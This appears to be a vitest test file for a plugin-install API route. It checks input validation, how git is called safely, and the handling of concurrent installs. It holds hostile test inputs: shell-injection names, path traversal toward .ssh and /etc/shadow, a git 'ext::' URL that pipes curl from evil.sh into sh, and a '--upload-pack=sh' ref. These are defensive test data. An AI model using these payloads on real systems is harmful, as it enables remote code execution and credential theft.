import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdir, writeFile, rm, readdir, readFile as read, utimes } from 'fs/promises';
import { join, dirname } from 'path';

/**
 * The property that matters: hostile input must never reach a process. So this
 * suite intercepts the spawn itself and asserts (a) that nothing is spawned for
 * a malicious body, and (b) that when git IS spawned it is spawned as
 * execFile('git', [argv…]) — an argv array, never a command string. That is what
 * makes shell metacharacters inert, so it is the thing worth pinning.
 *
 * Nothing here mocks the validation under test; install-guard runs for real.
 */

const execFileMock = vi.fn(
  (
    _file: string,
    _args: string[],
    _opts: unknown,
    cb: (e: Error | null, r: { stdout: string; stderr: string }) => void,
  ) => cb(null, { stdout: '', stderr: '' }),
);

vi.mock('child_process', () => ({ execFile: execFileMock }));

// Keep the suite off the real ~/.claude/plugins.
vi.mock('os', async (orig) => {
  const actual = await orig<typeof import('os')>();
  return { ...actual, homedir: () => '/tmp/aime-install-test-home' };
});

beforeEach(() => {
  execFileMock.mockClear();
});

const post = async (body: unknown) => {
  const { POST } = await import('./route');
  return POST(
    new Request('http://localhost/api/mcp/install', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }),
  );
};

describe('POST /api/mcp/install — nothing spawns for hostile input', () => {
  const hostileNames = [
    '$(id)',
    '`id`',
    'a;id',
    'a|id',
    '../../../.ssh',
    '..',
    'a/b',
    '.hidden',
    '-flag',
  ];

  it.each(hostileNames)('rejects name %j without spawning anything', async (name) => {
    const res = await post({ name, source: { source: 'github', repo: 'o/r' } });
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  const hostileSources = [
    { source: 'url', url: 'ext::sh -c "curl evil.sh|sh"' },
    { source: 'url', url: 'file:///tmp/evil' },
    { source: 'url', url: 'git@github.com:o/r.git' },
    { source: 'url', url: 'https://user:pw@github.com/o/r.git' },
    { source: 'github', repo: '../../evil' },
    { source: 'github', repo: 'o/r', ref: '--upload-pack=sh' },
    { source: 'git-subdir', url: 'https://h/r.git', path: '../../../etc' },
    { source: 'exec', url: 'https://h/r.git' },
    '../../../etc/shadow',
  ];

  it.each(hostileSources)('rejects source %j without spawning anything', async (source) => {
    const res = await post({ name: 'ok-name', source });
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('rejects a missing name or source', async () => {
    expect((await post({ source: { source: 'github', repo: 'o/r' } })).status).toBe(400);
    expect((await post({ name: 'x' })).status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

describe('POST /api/mcp/install — how git is invoked', () => {
  it('spawns git with an argv array, not a command string', async () => {
    await post({ name: 'my-plugin', source: { source: 'github', repo: 'anthropics/x', ref: 'main' } });

    expect(execFileMock).toHaveBeenCalledTimes(1);
    const [file, args] = execFileMock.mock.calls[0];
    expect(file).toBe('git');
    expect(Array.isArray(args)).toBe(true);
    expect(args.slice(0, -1)).toEqual([
      'clone',
      '--depth',
      '1',
      '--single-branch',
      '--branch',
      'main',
      '--',
      'https://github.com/anthropics/x.git',
    ]);
    // The destination is a per-request scratch dir, never the plugin's final home:
    // an interrupted clone there would leave a half plugin that dirExists() then
    // treats as installed forever.
    const dest = args.at(-1)!;
    expect(dest).toMatch(
      /^\/tmp\/aime-install-test-home\/\.claude\/plugins\/\.tmp-my-plugin-[^/]+\/repo$/,
    );
  });

  it('disables git credential prompting so a bad URL cannot hang the request', async () => {
    await post({ name: 'p2', source: { source: 'github', repo: 'o/r' } });
    const opts = execFileMock.mock.calls[0][2] as { env: Record<string, string>; timeout: number };
    expect(opts.env.GIT_TERMINAL_PROMPT).toBe('0');
    expect(opts.timeout).toBeGreaterThan(0);
  });

  it('clones into a path confined to the plugins directory', async () => {
    await post({ name: 'p3', source: { source: 'github', repo: 'o/r' } });
    const args = execFileMock.mock.calls[0][1];
    const targetDir = args[args.length - 1];
    expect(targetDir.startsWith('/tmp/aime-install-test-home/.claude/plugins/')).toBe(true);
    expect(targetDir).not.toContain('..');
  });

  it('does not leak git stderr to the caller', async () => {
    execFileMock.mockImplementationOnce((_f, _a, _o, cb) =>
      cb(new Error('fatal: could not read /Users/someone/.ssh/id_rsa'), { stdout: '', stderr: '' }),
    );
    const res = await post({ name: 'p4', source: { source: 'github', repo: 'o/r' } });
    expect(res.status).toBe(500);
    expect(await res.json()).toEqual({ error: 'Install failed' });
  });

  it('rejects a non-JSON body', async () => {
    const { POST } = await import('./route');
    const res = await POST(
      new Request('http://localhost/api/mcp/install', { method: 'POST', body: 'nope' }),
    );
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

/**
 * DEFECT 4 (regression): the temp dir lost its uniquifier — `.tmp-${name}-${Date.now()}`
 * became `.tmp-${safeName.value}` — leaving the comment claiming only that it
 * "keeps concurrent installs of DIFFERENT plugins apart". The same-name case the
 * timestamp had covered was unprotected: there is no lock, and `dirExists(targetDir)`
 * only catches installs that already FINISHED.
 *
 * The reachable trigger needs no devtools. browse-connectors.tsx mounts a PluginRow
 * with no `installedState`/`onStateChange`, so its "Working" guard is lost on
 * unmount: click Install, click "Browse all", click Install again.
 *
 * The worst outcome was silent. Both requests shared one scratch dir, so the
 * loser's `rm -rf` in `finally` deleted files out from under `srcDir` before the
 * winner's `rename` — promoting a PARTIALLY POPULATED plugin tree with
 * `success: true`, after which `dirExists` short-circuits forever and Install can
 * never repair it.
 */
describe('POST /api/mcp/install — overlapping installs of the same name', () => {
  const PLUGINS_DIR = '/tmp/aime-install-test-home/.claude/plugins';
  /** Enough files, written slowly enough, that two clones genuinely interleave. */
  const CLONE_TREE = [
    '.claude-plugin/plugin.json',
    'top.txt',
    'sub/.claude-plugin/plugin.json',
    'sub/one.txt',
    'sub/two.txt',
    'sub/three.txt',
    'sub/nested/four.txt',
  ];

  /** A git clone that actually populates the destination, file by file. */
  const slowClone = () =>
    execFileMock.mockImplementation(
      (
        _file: string,
        args: string[],
        _opts: unknown,
        cb: (e: Error | null, r: { stdout: string; stderr: string }) => void,
      ) => {
        const dest = args[args.length - 1];
        void (async () => {
          for (const rel of CLONE_TREE) {
            const abs = join(dest, rel);
            await mkdir(dirname(abs), { recursive: true });
            await writeFile(abs, rel.endsWith('.json') ? '{"name":"dup"}' : rel, 'utf-8');
            await new Promise((r) => setTimeout(r, 4));
          }
          cb(null, { stdout: '', stderr: '' });
        })();
      },
    );

  beforeEach(async () => {
    await rm('/tmp/aime-install-test-home', { recursive: true, force: true });
    slowClone();
  });

  afterEach(async () => {
    await rm('/tmp/aime-install-test-home', { recursive: true, force: true });
  });

  const subdirBody = { name: 'dup', source: { source: 'git-subdir', url: 'https://h/r.git', path: 'sub' } };

  it('never promotes a partial tree when two same-name subpath installs overlap', async () => {
    const [a, b] = await Promise.all([post(subdirBody), post(subdirBody)]);

    // Neither may claim success over an incomplete plugin.
    for (const res of [a, b]) {
      const body = (await res.json()) as { success?: boolean; error?: string };
      expect(res.status, body.error).toBe(200);
      expect(body.success).toBe(true);
      // The misleading 404 the shared scratch dir used to produce.
      expect(body.error).toBeUndefined();
    }

    // The promoted plugin is COMPLETE — every file the subpath contains.
    const promoted = join(PLUGINS_DIR, 'dup');
    expect((await readdir(promoted)).sort()).toEqual(['.claude-plugin', 'nested', 'one.txt', 'three.txt', 'two.txt']);
    expect(await read(join(promoted, 'nested', 'four.txt'), 'utf-8')).toBe('sub/nested/four.txt');
    expect(await read(join(promoted, '.claude-plugin', 'plugin.json'), 'utf-8')).toContain('dup');
  });

  it('leaves no orphaned .tmp-* directory behind — the plugin list cannot see them', async () => {
    await Promise.all([post(subdirBody), post(subdirBody)]);
    const entries = await readdir(PLUGINS_DIR);
    expect(entries.filter((e) => e.startsWith('.tmp'))).toEqual([]);
  });

  it('gives the two overlapping installs different scratch directories', async () => {
    await Promise.all([post(subdirBody), post(subdirBody)]);
    const destinations = execFileMock.mock.calls.map((c) => (c[1] as string[]).at(-1));
    expect(destinations).toHaveLength(2);
    expect(new Set(destinations).size).toBe(2);
  });

  it('stages a whole-repo install too, so a half-cloned tree is never the target', async () => {
    const body = { name: 'dup', source: { source: 'github', repo: 'o/r' } };
    const [a, b] = await Promise.all([post(body), post(body)]);
    for (const res of [a, b]) expect(res.status).toBe(200);

    // git was never pointed at the final directory, so an interrupted clone
    // cannot leave a partial plugin that dirExists() then treats as installed.
    for (const call of execFileMock.mock.calls) {
      expect((call[1] as string[]).at(-1)).not.toBe(join(PLUGINS_DIR, 'dup'));
    }
    expect((await readdir(join(PLUGINS_DIR, 'dup'))).sort()).toEqual(['.claude-plugin', 'sub', 'top.txt']);
    expect((await readdir(PLUGINS_DIR)).filter((e) => e.startsWith('.tmp'))).toEqual([]);
  });
});

/**
 * The `finally` below only runs if the process survives. A SIGKILL, a power loss
 * or a dev-server restart between mkdtemp and the promoting rename leaves the
 * scratch tree in ~/.claude/plugins, which is what sweepAbandonedScratch exists
 * for. It just could not be reached in the case that matters most.
 */
describe('POST /api/mcp/install — sweeping scratch a crashed install left behind', () => {
  const PLUGINS_DIR = '/tmp/aime-install-test-home/.claude/plugins';
  const OLD = Date.now() - 10 * 60_000;

  const leaveOrphan = async (name: string) => {
    const dir = join(PLUGINS_DIR, `.tmp-${name}-crashed`, 'repo');
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'partial.txt'), 'half a clone', 'utf-8');
    // Backdated past TEMP_SWEEP_AGE_MS so it is provably not a live clone.
    await utimes(join(PLUGINS_DIR, `.tmp-${name}-crashed`), OLD / 1000, OLD / 1000);
  };

  const scratchDirs = async () =>
    (await readdir(PLUGINS_DIR)).filter((e) => e.startsWith('.tmp-'));

  beforeEach(async () => {
    await rm('/tmp/aime-install-test-home', { recursive: true, force: true });
    await mkdir(PLUGINS_DIR, { recursive: true });
    execFileMock.mockImplementation((_f, args: string[], _o, cb) => {
      const dest = (args as string[]).at(-1)!;
      void mkdir(join(dest, '.claude-plugin'), { recursive: true })
        .then(() => writeFile(join(dest, '.claude-plugin', 'plugin.json'), '{"name":"p"}', 'utf-8'))
        .then(() => cb(null, { stdout: '', stderr: '' }));
    });
  });

  afterEach(async () => {
    await rm('/tmp/aime-install-test-home', { recursive: true, force: true });
  });

  it('removes an aged orphan on the next install', async () => {
    await leaveOrphan('p');
    expect(await scratchDirs()).toHaveLength(1);

    expect((await post({ name: 'p', source: { source: 'github', repo: 'o/r' } })).status).toBe(200);
    expect(await scratchDirs()).toEqual([]);
  });

  it('REGRESSION: sweeps even when the plugin is already installed', async () => {
    // The retry after a crash is what installs the plugin, and from then on every
    // Install returns early at dirExists(targetDir). With the sweep behind that
    // return, the leftover was unreachable and stayed on disk forever.
    await mkdir(join(PLUGINS_DIR, 'p', '.claude-plugin'), { recursive: true });
    await writeFile(join(PLUGINS_DIR, 'p', '.claude-plugin', 'plugin.json'), '{"name":"p"}', 'utf-8');
    await leaveOrphan('p');

    const res = await post({ name: 'p', source: { source: 'github', repo: 'o/r' } });
    expect((await res.json()).alreadyInstalled).toBe(true);
    // Nothing was cloned — the sweep is the only thing that ran.
    expect(execFileMock).not.toHaveBeenCalled();
    expect(await scratchDirs()).toEqual([]);
  });

  it('never touches a scratch directory young enough to be a live clone', async () => {
    const dir = join(PLUGINS_DIR, '.tmp-other-inflight');
    await mkdir(join(dir, 'repo'), { recursive: true });

    await post({ name: 'p', source: { source: 'github', repo: 'o/r' } });
    expect(await scratchDirs()).toEqual(['.tmp-other-inflight']);
  });
});
